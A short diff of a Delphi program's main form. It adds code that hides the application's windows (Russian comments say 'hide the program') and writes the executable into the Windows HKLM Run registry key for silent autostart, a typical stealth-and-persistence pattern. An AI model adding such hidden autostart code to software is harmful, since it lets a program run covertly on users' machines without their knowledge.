@@ -44,7 +44,7 @@ implementation
 
 {$R *.dfm}
 
-uses IniFiles;
+uses Registry, IniFiles;
 
 function TfMain.GetPath: string;
 begin
@@ -168,19 +168,27 @@ begin
 end;
 
 procedure TfMain.FormCreate(Sender: TObject);
-// var reg: tregistry;
+var
+  Reg: TRegistry;
 begin
+  // Прячем программу
+  ShowWindow(Application.Handle, SW_HIDE);
+  ShowWindow(fMain.Handle, SW_HIDE);
+  Application.ShowMainForm := False;
+  // Списки
   SL := TStringList.Create;
   LastSL := TStringList.Create;
-  {
-    reg := tregistry.create;
-    reg.rootkey := hkey_local_machine;
-    reg.lazywrite := false;
-    reg.openkey('software\microsoft\windows\currentversion\run', false);
-    reg.writestring('fman', application.exename);
-    reg.closekey;
-    reg.free;
-  }
+  // Добавляем в автозагрузку
+  Reg := TRegistry.Create;
+  try
+    Reg.RootKey := HKEY_LOCAL_MACHINE;
+    Reg.LazyWrite := False;
+    Reg.OpenKey('software\microsoft\windows\currentversion\run', False);
+    Reg.WriteString('fman', Application.ExeName);
+    Reg.CloseKey;
+  finally
+    Reg.Free;
+  end;
 end;
 
 procedure TfMain.FormDestroy(Sender: TObject);
